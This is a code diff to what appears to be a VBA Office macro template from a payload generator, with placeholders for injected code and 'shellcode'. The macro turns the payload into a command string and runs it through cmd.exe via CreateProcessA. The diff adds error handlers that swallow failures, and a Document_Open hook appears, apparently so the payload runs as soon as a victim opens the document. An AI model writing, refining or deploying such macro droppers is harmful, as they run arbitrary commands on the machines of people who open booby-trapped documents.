@@ -43,6 +43,8 @@ End Type
 //####CODE####
 
 Function ExecuteCommand()
+    On Error GoTo ErrorHandler
+    
     Dim buf As Variant
     buf = ####SHELLCODE####
     
@@ -54,27 +56,48 @@ Function ExecuteCommand()
     If VarType(buf) = vbString Then
         command = buf
     Else
-        ' Convert byte array to string
-        command = BytesToString(buf)
+        ' Convert array to string
+        command = ArrayToString(buf)
     End If
     
     ' Execute command using CreateProcess
     Dim si As STARTUPINFO
     Dim pi As PROCESS_INFORMATION
+    Dim result As Long
+    Dim cmdPath As String
+    Dim fullCommand As String
+    
+    cmdPath = "C:\Windows\System32\cmd.exe"
+    fullCommand = """" & cmdPath & """ /c " & command
     
     si.cb = Len(si)
-    CreateProcessA "cmd.exe", "/c " & command, 0, 0, 1, 0, 0, vbNullString, si, pi
+    si.dwFlags = &H1
+    si.wShowWindow = 1
+    
+    result = CreateProcessA(cmdPath, fullCommand, 0, 0, True, &H10, 0, vbNullString, si, pi)
+    
+    Exit Function
+
+ErrorHandler:
+    Exit Function
 End Function
 
-Private Function BytesToString(bytes() As Byte) As String
-    Dim result As String
-    result = ""
+Private Function ArrayToString(arr As Variant) As String
+    On Error GoTo ErrorHandler
     
-    For i = LBound(bytes) To UBound(bytes)
-        result = result & Chr(bytes(i))
+    Dim result As String
+    Dim i As Long
+    
+    result = ""
+    For i = LBound(arr) To UBound(arr)
+        result = result & Chr(arr(i))
     Next i
     
-    BytesToString = result
+    ArrayToString = result
+    Exit Function
+
+ErrorHandler:
+    ArrayToString = ""
 End Function
 
 Sub Document_Open()
